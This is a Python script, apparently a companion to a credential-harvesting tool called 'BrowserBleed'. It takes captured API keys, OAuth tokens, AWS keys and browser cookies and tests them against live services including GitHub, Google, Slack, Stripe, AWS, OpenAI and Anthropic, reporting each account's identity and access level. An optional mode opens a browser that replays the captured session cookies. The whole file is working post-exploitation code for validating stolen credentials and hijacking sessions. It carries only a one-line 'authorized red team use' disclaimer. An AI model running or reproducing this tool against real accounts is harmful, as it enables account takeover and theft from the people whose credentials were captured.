#!/usr/bin/env python3
"""
sessiontest.py — Test captured BrowserBleed credentials against live services.

Reads bb_results.csv (output of BrowserBleed) and attempts to authenticate to
each identified service, reporting identity and access level.

Usage:
    python3 sessiontest.py                           # auto-finds bb_results.csv
    python3 sessiontest.py path/to/results.csv       # explicit file
    python3 sessiontest.py --browser results.csv     # also open cookie browser sessions
    python3 sessiontest.py --timeout 15              # per-request timeout (default 10s)
    python3 sessiontest.py --json                    # machine-readable output
    python3 sessiontest.py --no-verify-ssl           # skip TLS cert verification

For authorized red team use only.
"""

import argparse
import base64
import csv
import json
import os
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from collections import defaultdict

# ── ANSI colours ──────────────────────────────────────────────────────────────

def _colour(code: str, text: str) -> str:
    if not sys.stdout.isatty():
        return text
    return f"\033[{code}m{text}\033[0m"

green  = lambda t: _colour("32", t)
red    = lambda t: _colour("31", t)
yellow = lambda t: _colour("33", t)
cyan   = lambda t: _colour("36", t)
bold   = lambda t: _colour("1",  t)
dim    = lambda t: _colour("2",  t)

# ── HTTP helper ────────────────────────────────────────────────────────────────

_timeout = 10
_ssl_ctx = ssl.create_default_context()

def _get(url: str, headers: dict, *, body: bytes = None, method: str = "GET") -> tuple[int, dict]:
    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=_timeout, context=_ssl_ctx) as r:
            raw = r.read()
            try:
                return r.status, json.loads(raw)
            except Exception:
                return r.status, {}
    except urllib.error.HTTPError as e:
        try:
            body = e.read()
            return e.code, json.loads(body)
        except Exception:
            return e.code, {}
    except Exception as e:
        return 0, {"_error": str(e)}

# ── JWT decode (no network) ───────────────────────────────────────────────────

def _b64pad(s: str) -> str:
    return s + "=" * (-len(s) % 4)

def _decode_jwt(token: str) -> dict | None:
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header  = json.loads(base64.urlsafe_b64decode(_b64pad(parts[0])))
        payload = json.loads(base64.urlsafe_b64decode(_b64pad(parts[1])))
        return {"header": header, "payload": payload}
    except Exception:
        return None

# ── Result structure ──────────────────────────────────────────────────────────

class Result:
    def __init__(self, service: str, label: str, value_preview: str,
                 status: str, identity: str, access: str, raw: dict = None):
        self.service       = service
        self.label         = label
        self.value_preview = value_preview
        self.status        = status   # "valid", "expired", "invalid", "error", "info"
        self.identity      = identity
        self.access        = access
        self.raw           = raw or {}

    def to_dict(self) -> dict:
        return {
            "service":       self.service,
            "label":         self.label,
            "value_preview": self.value_preview,
            "status":        self.status,
            "identity":      self.identity,
            "access":        self.access,
        }

# ── Testers ───────────────────────────────────────────────────────────────────

def test_github(value: str, label: str) -> Result:
    status, data = _get(
        "https://api.github.com/user",
        {"Authorization": f"Bearer {value}", "User-Agent": "sessiontest/1.0"},
    )
    if status == 200:
        login  = data.get("login", "?")
        name   = data.get("name") or login
        email  = data.get("email") or ""
        pub    = data.get("public_repos", 0)

        _, orgs = _get(
            "https://api.github.com/user/orgs",
            {"Authorization": f"Bearer {value}", "User-Agent": "sessiontest/1.0"},
        )
        org_names = [o.get("login", "") for o in (orgs if isinstance(orgs, list) else [])]

        _, repos = _get(
            "https://api.github.com/user/repos?type=private&per_page=1",
            {"Authorization": f"Bearer {value}", "User-Agent": "sessiontest/1.0"},
        )

        scopes_header = ""  # scopes come from response headers, not in data — best effort
        parts = [f"{pub} public repos"]
        if isinstance(repos, list) and repos:
            parts.append("private repos ✓")
        if org_names:
            parts.append("orgs: " + ", ".join(org_names[:3]))

        identity = f"{name} ({login})"
        if email:
            identity += f"  <{email}>"
        return Result("GitHub", label, value[:12] + "…", "valid",
                      identity, "  ".join(parts), data)
    if status == 401:
        return Result("GitHub", label, value[:12] + "…", "invalid",
                      "—", "token rejected (401)", data)
    return Result("GitHub", label, value[:12] + "…", "error",
                  "—", f"HTTP {status}", data)


def test_google_oauth(value: str, label: str) -> Result:
    status, data = _get(
        "https://www.googleapis.com/oauth2/v3/userinfo",
        {"Authorization": f"Bearer {value}"},
    )
    if status == 200:
        email = data.get("email", "?")
        name  = data.get("name", "")
        identity = f"{name} <{email}>" if name else email
        return Result("Google", label, value[:12] + "…", "valid",
                      identity, "OAuth userinfo readable", data)

    # Try tokeninfo for scope info
    status2, data2 = _get(
        f"https://oauth2.googleapis.com/tokeninfo?access_token={urllib.parse.quote(value)}",
        {},
    )
    if status2 == 200:
        email  = data2.get("email", "?")
        scope  = data2.get("scope", "")
        exp    = data2.get("expires_in", "?")
        access = f"scope: {scope[:80]}  expires_in: {exp}s"
        return Result("Google", label, value[:12] + "…", "valid",
                      email, access, data2)

    err = data.get("error_description") or data.get("error") or f"HTTP {status}"
    stat = "expired" if "expired" in str(err).lower() else "invalid"
    return Result("Google", label, value[:12] + "…", stat, "—", err, data)


def test_slack(value: str, label: str) -> Result:
    status, data = _get(
        "https://slack.com/api/auth.test",
        {"Authorization": f"Bearer {value}", "Content-Type": "application/json"},
        body=b"{}",
        method="POST",
    )
    if status == 200 and data.get("ok"):
        user     = data.get("user", "?")
        team     = data.get("team", "?")
        team_url = data.get("url", "")
        return Result("Slack", label, value[:14] + "…", "valid",
                      f"{user} @ {team}", team_url, data)
    err = data.get("error", f"HTTP {status}")
    stat = "expired" if err in ("token_revoked", "token_expired") else "invalid"
    return Result("Slack", label, value[:14] + "…", stat, "—", err, data)


def test_anthropic(value: str, label: str) -> Result:
    status, data = _get(
        "https://api.anthropic.com/v1/models",
        {"x-api-key": value, "anthropic-version": "2023-06-01"},
    )
    if status == 200:
        models = [m.get("id", "") for m in data.get("data", [])[:3]]
        return Result("Anthropic", label, value[:16] + "…", "valid",
                      "API key accepted", "models: " + ", ".join(models), data)
    err = data.get("error", {})
    msg = (err.get("message") if isinstance(err, dict) else str(err)) or f"HTTP {status}"
    stat = "invalid" if status in (401, 403) else "error"
    return Result("Anthropic", label, value[:16] + "…", stat, "—", msg[:80], data)


def test_openai(value: str, label: str) -> Result:
    status, data = _get(
        "https://api.openai.com/v1/models",
        {"Authorization": f"Bearer {value}"},
    )
    if status == 200:
        models = [m.get("id", "") for m in data.get("data", [])[:3]]
        return Result("OpenAI", label, value[:14] + "…", "valid",
                      "API key accepted", "models: " + ", ".join(models), data)
    err = data.get("error", {})
    msg = (err.get("message") if isinstance(err, dict) else str(err)) or f"HTTP {status}"
    stat = "invalid" if status in (401, 403) else "error"
    return Result("OpenAI", label, value[:14] + "…", stat, "—", msg[:80], data)


def test_huggingface(value: str, label: str) -> Result:
    status, data = _get(
        "https://huggingface.co/api/whoami-v2",
        {"Authorization": f"Bearer {value}"},
    )
    if status == 200:
        name  = data.get("name", "?")
        email = data.get("email", "")
        orgs  = [o.get("name", "") for o in data.get("orgs", [])[:3]]
        access_str = "orgs: " + ", ".join(orgs) if orgs else "no orgs"
        identity = f"{name} <{email}>" if email else name
        return Result("HuggingFace", label, value[:12] + "…", "valid",
                      identity, access_str, data)
    stat = "invalid" if status in (401, 403) else "error"
    return Result("HuggingFace", label, value[:12] + "…", stat, "—", f"HTTP {status}", data)


def test_stripe(value: str, label: str) -> Result:
    status, data = _get(
        "https://api.stripe.com/v1/account",
        {"Authorization": f"Bearer {value}"},
    )
    if status == 200:
        acct_id    = data.get("id", "?")
        email      = data.get("email", "")
        biz_name   = data.get("business_profile", {}).get("name", "")
        livemode   = data.get("livemode", False)
        mode       = "LIVE" if livemode else "test"
        identity   = email or acct_id
        if biz_name:
            identity = f"{biz_name} ({identity})"
        return Result("Stripe", label, value[:16] + "…", "valid",
                      identity, f"account {acct_id}  mode={mode}", data)
    err = data.get("error", {})
    msg = (err.get("message") if isinstance(err, dict) else str(err)) or f"HTTP {status}"
    stat = "invalid" if status in (401, 403) else "error"
    return Result("Stripe", label, value[:16] + "…", stat, "—", msg[:80], data)


def test_npm(value: str, label: str) -> Result:
    status, data = _get(
        "https://registry.npmjs.org/-/whoami",
        {"Authorization": f"Bearer {value}"},
    )
    if status == 200:
        username = data.get("username", "?")
        return Result("npm", label, value[:16] + "…", "valid",
                      username, "registry access confirmed", data)
    stat = "invalid" if status in (401, 403) else "error"
    return Result("npm", label, value[:16] + "…", stat, "—", f"HTTP {status}", data)


def test_jwt(value: str, label: str, service: str) -> Result:
    decoded = _decode_jwt(value)
    if not decoded:
        return Result(service or "JWT", label, value[:20] + "…", "error",
                      "—", "could not decode", {})
    payload = decoded["payload"]
    now = time.time()
    exp = payload.get("exp")
    iat = payload.get("iat")

    if exp:
        remaining = exp - now
        if remaining < 0:
            age = int(-remaining)
            time_str = f"expired {age//3600}h{(age%3600)//60}m ago"
            stat = "expired"
        else:
            time_str = f"valid for {int(remaining//3600)}h{int(remaining%3600)//60}m"
            stat = "valid"
    else:
        time_str = "no expiry"
        stat = "info"

    identity_parts = []
    for key in ("sub", "email", "preferred_username", "unique_name", "upn"):
        if payload.get(key):
            identity_parts.append(str(payload[key]))
            break

    access_parts = [time_str]
    for key in ("iss", "aud"):
        val = payload.get(key)
        if val:
            if isinstance(val, list):
                val = val[0]
            access_parts.append(f"{key}={str(val)[:40]}")

    svc = service or payload.get("iss", "JWT")
    preview = value[:20] + "…" if len(value) > 20 else value
    return Result(svc, label, preview, stat,
                  ", ".join(identity_parts) or "—",
                  "  ".join(access_parts), decoded)


def test_aws(access_key: str, secret_key: str, label: str) -> Result:
    """Sign a STS GetCallerIdentity request with SigV4."""
    import hashlib
    import hmac as _hmac
    import xml.etree.ElementTree as ET
    from datetime import datetime, timezone

    dt   = datetime.now(timezone.utc)
    date = dt.strftime("%Y%m%d")
    amz  = dt.strftime("%Y%m%dT%H%M%SZ")
    region = "us-east-1"
    svc_name = "sts"
    host = "sts.amazonaws.com"
    body = b"Action=GetCallerIdentity&Version=2011-06-15"

    def sign(key: bytes, msg: str) -> bytes:
        return _hmac.new(key, msg.encode("utf-8"), hashlib.sha256).digest()

    body_hash      = hashlib.sha256(body).hexdigest()
    canon_headers  = f"content-type:application/x-www-form-urlencoded\nhost:{host}\nx-amz-date:{amz}\n"
    signed_headers = "content-type;host;x-amz-date"
    canon_req = "\n".join(["POST", "/", "", canon_headers, signed_headers, body_hash])
    string_to_sign = "\n".join([
        "AWS4-HMAC-SHA256", amz,
        f"{date}/{region}/{svc_name}/aws4_request",
        hashlib.sha256(canon_req.encode()).hexdigest(),
    ])
    k_signing = sign(sign(sign(sign(b"AWS4" + secret_key.encode(), date), region), svc_name), "aws4_request")
    sig = _hmac.new(k_signing, string_to_sign.encode(), hashlib.sha256).hexdigest()

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "x-amz-date": amz,
        "Authorization": (
            f"AWS4-HMAC-SHA256 Credential={access_key}/{date}/{region}/{svc_name}/aws4_request,"
            f" SignedHeaders={signed_headers}, Signature={sig}"
        ),
    }
    req = urllib.request.Request(f"https://{host}/", data=body, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=_timeout, context=_ssl_ctx) as r:
            xml_bytes = r.read()
        root   = ET.fromstring(xml_bytes)
        ns     = {"s": "https://sts.amazonaws.com/doc/2011-06-15/"}
        result = root.find(".//s:GetCallerIdentityResult", ns)
        arn     = result.find("s:Arn",     ns).text if result is not None else "?"
        account = result.find("s:Account", ns).text if result is not None else "?"
        user_id = result.find("s:UserId",  ns).text if result is not None else "?"
        return Result("AWS", label, access_key[:16] + "…", "valid",
                      arn, f"account {account}  userId {user_id}", {})
    except urllib.error.HTTPError as e:
        stat = "invalid" if e.code in (401, 403) else "error"
        return Result("AWS", label, access_key[:16] + "…", stat, "—", f"HTTP {e.code}", {})
    except Exception as e:
        return Result("AWS", label, access_key[:16] + "…", "error", "—", str(e)[:80], {})


def test_cookie_session(domain: str, cookies: list[dict], *, browser: bool) -> list[Result]:
    """
    Test cookie session for a domain.
    cookies: list of {"name": ..., "value": ...}

    For known services, hit an API endpoint.
    Always report the cookie count and names.
    """
    results = []
    jar = "; ".join(f"{c['name']}={c['value']}" for c in cookies)
    cookie_names = ", ".join(c["name"] for c in cookies[:6])
    if len(cookies) > 6:
        cookie_names += f" +{len(cookies)-6} more"

    known = _DOMAIN_TESTS.get(domain) or _DOMAIN_TESTS.get(_strip_sub(domain))
    if known:
        url, key_cookie = known
        has_key = any(c["name"] == key_cookie for c in cookies)
        if has_key:
            status, data = _get(url, {"Cookie": jar, "User-Agent": _UA})
            if status == 200:
                identity, access = _parse_cookie_identity(domain, data)
                results.append(Result(domain, "Cookie session", cookie_names, "valid",
                                      identity, access, data))
            else:
                results.append(Result(domain, "Cookie session", cookie_names, "invalid",
                                      "—", f"HTTP {status} at {url}", data))
        else:
            results.append(Result(domain, "Cookie session", cookie_names, "info",
                                  "—", f"{len(cookies)} cookie(s) — key cookie missing", {}))
    else:
        results.append(Result(domain, "Cookie session", cookie_names, "info",
                              "—", f"{len(cookies)} cookie(s) (use --browser to open)", {}))

    if browser:
        _open_browser_session(domain, cookies)

    return results


_UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/124 Safari/537.36"

# domain → (test_url, key_cookie_name)
_DOMAIN_TESTS = {
    "github.com":               ("https://api.github.com/user",              "_gh_sess"),
    ".github.com":              ("https://api.github.com/user",              "_gh_sess"),
    "accounts.google.com":      ("https://www.googleapis.com/oauth2/v3/userinfo", "SAPISID"),
    ".google.com":              ("https://www.googleapis.com/oauth2/v3/userinfo", "SAPISID"),
    "app.slack.com":            ("https://slack.com/api/auth.test",           "d"),
    ".slack.com":               ("https://slack.com/api/auth.test",           "d"),
    "discord.com":              ("https://discord.com/api/v10/users/@me",     "__dcfduid"),
    ".discord.com":             ("https://discord.com/api/v10/users/@me",     "__dcfduid"),
    "twitter.com":              ("https://api.twitter.com/2/users/me",        "auth_token"),
    ".twitter.com":             ("https://api.twitter.com/2/users/me",        "auth_token"),
    "x.com":                    ("https://api.twitter.com/2/users/me",        "auth_token"),
}

def _strip_sub(domain: str) -> str:
    """Turn api.github.com → .github.com for lookup."""
    parts = domain.lstrip(".").split(".")
    if len(parts) > 2:
        return "." + ".".join(parts[-2:])
    return domain

def _parse_cookie_identity(domain: str, data: dict) -> tuple[str, str]:
    # Best-effort extraction from common API response shapes
    for key in ("login", "username", "name", "email", "screen_name", "user"):
        if isinstance(data.get(key), str):
            return data[key], f"{domain} session valid"
    return "authenticated", f"{domain} session valid"


def _open_browser_session(domain: str, cookies: list[dict]):
    """Launch a Playwright browser with the captured cookies."""
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        print(yellow(f"\n  [browser] pip install playwright && playwright install chromium"))
        return

    scheme = "https"
    url    = f"{scheme}://{domain.lstrip('.')}/"
    print(cyan(f"\n  [browser] Opening {url} with {len(cookies)} cookie(s)…"))
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False)
        ctx     = browser.new_context()
        ctx.add_cookies([{
            "name":   c["name"],
            "value":  c["value"],
            "domain": domain if domain.startswith(".") else f".{domain}",
            "path":   "/",
        } for c in cookies])
        page = ctx.new_page()
        page.goto(url)
        input(dim("  Press Enter to close browser…"))
        browser.close()

# ── Dispatch ──────────────────────────────────────────────────────────────────

def _dispatch(label: str, service: str, value: str, browser: bool) -> list[Result]:
    lo = label.lower()
    v  = value.strip()

    # GitHub
    if any(x in lo for x in ("github",)) or v.startswith(("ghp_", "gho_", "ghs_", "ghr_", "ghu_")):
        return [test_github(v, label)]

    # Google OAuth
    if v.startswith("ya29."):
        return [test_google_oauth(v, label)]

    # Slack
    if v.startswith(("xoxp-", "xoxb-", "xoxa-", "xoxs-", "xoxe-")):
        return [test_slack(v, label)]

    # Anthropic
    if v.startswith("sk-ant-"):
        return [test_anthropic(v, label)]

    # OpenAI
    if v.startswith("sk-") and not v.startswith("sk-ant-"):
        return [test_openai(v, label)]

    # HuggingFace
    if v.startswith("hf_"):
        return [test_huggingface(v, label)]

    # Stripe
    if v.startswith(("sk_live_", "sk_test_", "rk_live_", "rk_test_")):
        return [test_stripe(v, label)]

    # npm auth token (typically 36-char UUID or base64)
    if "npm" in lo:
        return [test_npm(v, label)]

    # JWT — three base64url parts separated by dots
    parts = v.split(".")
    if len(parts) == 3 and all(len(p) > 10 for p in parts):
        decoded = _decode_jwt(v)
        if decoded:
            return [test_jwt(v, label, service)]

    # Bearer token with service hint
    if "bearer" in lo:
        svc_lo = service.lower()
        if "github" in svc_lo:
            return [test_github(v, label)]
        if "google" in svc_lo:
            return [test_google_oauth(v, label)]
        if "slack" in svc_lo:
            return [test_slack(v, label)]

    return []  # no tester matched


# ── CSV reading ───────────────────────────────────────────────────────────────

def _find_csv() -> str | None:
    candidates = [
        "bb_results.csv",
        os.path.join(os.path.dirname(os.path.abspath(__file__)), "bb_results.csv"),
    ]
    for p in candidates:
        if os.path.exists(p):
            return p
    return None


def load_rows(path: str) -> list[dict]:
    with open(path, newline="", encoding="utf-8", errors="replace") as f:
        reader = csv.DictReader(f)
        return list(reader)


# ── Main ──────────────────────────────────────────────────────────────────────

BANNER = """\
  ╔══════════════════════════════════════════╗
  ║   BrowserBleed — Session Test           ║
  ║   Test captured credentials live        ║
  ╚══════════════════════════════════════════╝\
"""

def main():
    global _timeout, _ssl_ctx

    parser = argparse.ArgumentParser(
        description="Test BrowserBleed captured credentials against live services",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("csv_file", nargs="?", help="bb_results.csv path (auto-detected if omitted)")
    parser.add_argument("--browser",        action="store_true", help="Open Playwright browser for cookie sessions")
    parser.add_argument("--timeout",        type=int, default=10, metavar="SECS", help="Per-request timeout in seconds (default 10)")
    parser.add_argument("--no-verify-ssl",  action="store_true", help="Skip TLS certificate verification")
    parser.add_argument("--json",           action="store_true", help="Output results as JSON")
    parser.add_argument("--delay",          type=float, default=0.3, metavar="SECS", help="Delay between requests (default 0.3s)")
    args = parser.parse_args()

    _timeout = args.timeout
    if args.no_verify_ssl:
        _ssl_ctx = ssl.create_default_context()
        _ssl_ctx.check_hostname = False
        _ssl_ctx.verify_mode    = ssl.CERT_NONE

    csv_path = args.csv_file or _find_csv()
    if not csv_path:
        print(red("[!] No bb_results.csv found. Run BrowserBleed first, or pass the path explicitly."))
        sys.exit(1)
    if not os.path.exists(csv_path):
        print(red(f"[!] File not found: {csv_path}"))
        sys.exit(1)

    if not args.json:
        print(bold(BANNER))
        print(f"\n  {dim('Source:')} {csv_path}\n")

    rows = load_rows(csv_path)
    if not rows:
        print(yellow("[!] CSV is empty."))
        sys.exit(0)

    # ── Separate cookies (need to be grouped by domain) ─────────────────────
    cookie_rows:  list[dict] = []
    cred_rows:    list[dict] = []
    for row in rows:
        if "cookie" in row.get("label", "").lower():
            cookie_rows.append(row)
        else:
            cred_rows.append(row)

    # ── Deduplicate non-cookie credentials by value ──────────────────────────
    seen_values: set[str] = set()
    unique_creds: list[dict] = []
    for row in cred_rows:
        v = row.get("value", "").strip()
        if not v or v in seen_values:
            continue
        seen_values.add(v)
        unique_creds.append(row)

    # ── Group cookies by domain ──────────────────────────────────────────────
    cookies_by_domain: dict[str, list[dict]] = defaultdict(list)
    seen_cookie_pairs: set[tuple] = set()
    for row in cookie_rows:
        domain  = row.get("service", "") or row.get("address", "")
        raw_val = row.get("value", "")
        if "=" in raw_val:
            name, _, val = raw_val.partition("=")
        else:
            name, val = raw_val, ""
        pair = (domain, name, val)
        if pair in seen_cookie_pairs:
            continue
        seen_cookie_pairs.add(pair)
        cookies_by_domain[domain].append({"name": name.strip(), "value": val.strip()})

    # ── Try to pair AWS access keys with secret keys ─────────────────────────
    aws_keys: dict[str, str] = {}  # access_key_id → secret (if found together)
    for row in unique_creds:
        v = row.get("value", "").strip()
        if len(v) == 20 and v.startswith(("AKIA", "ASIA", "AROA", "AIDA")):
            aws_keys[v] = ""  # mark as found, secret TBD

    # Look for AWS secret keys (40-char base64-ish strings near AWS key rows)
    # Simple heuristic: if there's exactly one AWS key and one 40-char secret-looking value nearby
    aws_secrets = [
        row.get("value", "").strip() for row in unique_creds
        if row.get("label", "").lower() in ("aws secret key", "aws secret access key")
           and len(row.get("value", "").strip()) == 40
    ]
    if len(aws_keys) == 1 and len(aws_secrets) == 1:
        only_key = next(iter(aws_keys))
        aws_keys[only_key] = aws_secrets[0]

    # ── Run tests ─────────────────────────────────────────────────────────────
    all_results: list[Result] = []
    total = len(unique_creds) + len(cookies_by_domain)

    if not args.json:
        print(f"  Testing {bold(str(len(unique_creds)))} unique credential(s)  +  "
              f"{bold(str(len(cookies_by_domain)))} cookie domain(s)…\n")

    # API credentials
    for i, row in enumerate(unique_creds):
        label   = row.get("label", "")
        service = row.get("service", "")
        value   = row.get("value", "").strip()

        # AWS: skip bare access key if we have a paired secret
        if value in aws_keys:
            secret = aws_keys[value]
            if secret:
                r = test_aws(value, secret, label)
                all_results.append(r)
            else:
                all_results.append(Result("AWS", label, value[:16] + "…", "info",
                                          "—", "secret key not found — cannot sign request", {}))
            if not args.json:
                _print_progress(i+1, total, r if secret else all_results[-1])
            time.sleep(args.delay)
            continue

        results = _dispatch(label, service, value, args.browser)
        for r in results:
            all_results.append(r)
            if not args.json:
                _print_progress(i+1, total, r)
        if not results and not args.json:
            pass  # silently skip unrecognised credential types
        if results:
            time.sleep(args.delay)

    # Cookie sessions
    for i, (domain, cookies) in enumerate(cookies_by_domain.items()):
        if not domain:
            continue
        results = test_cookie_session(domain, cookies, browser=args.browser)
        for r in results:
            all_results.append(r)
            if not args.json:
                _print_progress(len(unique_creds)+i+1, total, r)
        time.sleep(args.delay)

    # ── Output ────────────────────────────────────────────────────────────────
    if args.json:
        print(json.dumps([r.to_dict() for r in all_results], indent=2))
        return

    if not all_results:
        print(yellow("  No testable credentials found in CSV."))
        print(dim("  (BrowserBleed must capture tokens/cookies with recognised labels)"))
        return

    print()
    _print_table(all_results)

    valid   = sum(1 for r in all_results if r.status == "valid")
    expired = sum(1 for r in all_results if r.status == "expired")
    invalid = sum(1 for r in all_results if r.status == "invalid")
    info    = sum(1 for r in all_results if r.status == "info")

    print(f"\n  {green(str(valid))} valid   "
          f"{yellow(str(expired))} expired   "
          f"{red(str(invalid))} invalid   "
          f"{dim(str(info))} info\n")


# ── Display helpers ────────────────────────────────────────────────────────────

def _status_str(status: str) -> str:
    if status == "valid":   return green("✓ valid  ")
    if status == "expired": return yellow("⏱ expired")
    if status == "invalid": return red("✗ invalid")
    if status == "error":   return red("! error  ")
    return dim("· info   ")

def _print_progress(n: int, total: int, r: Result):
    bar = f"[{n}/{total}]"
    print(f"  {dim(bar):12}  {_status_str(r.status)}  {cyan(r.service):<20}  {r.identity[:40]}")

def _print_table(results: list[Result]):
    W_SVC   = 14
    W_STAT  = 11
    W_LABEL = 18
    W_IDENT = 36
    W_VALUE = 20
    sep = dim("─" * (W_SVC + W_STAT + W_LABEL + W_IDENT + W_VALUE + 12))

    header = (
        f"  {bold('Service'):<{W_SVC+7}}  "
        f"{'Status':<{W_STAT}}  "
        f"{'Label':<{W_LABEL}}  "
        f"{'Identity':<{W_IDENT}}  "
        f"{'Token prefix'}"
    )
    print(header)
    print(sep)
    for r in results:
        svc   = cyan(r.service[:W_SVC])
        stat  = _status_str(r.status)
        label = (r.label[:W_LABEL]).ljust(W_LABEL)
        ident = (r.identity[:W_IDENT]).ljust(W_IDENT)
        val   = dim(r.value_preview)
        print(f"  {svc:<{W_SVC+8}}  {stat}  {label}  {ident}  {val}")
        if r.access and r.status in ("valid", "info"):
            print(f"  {' '*W_SVC}             {' '*W_LABEL}  {dim(r.access[:80])}")
    print(sep)


if __name__ == "__main__":
    main()
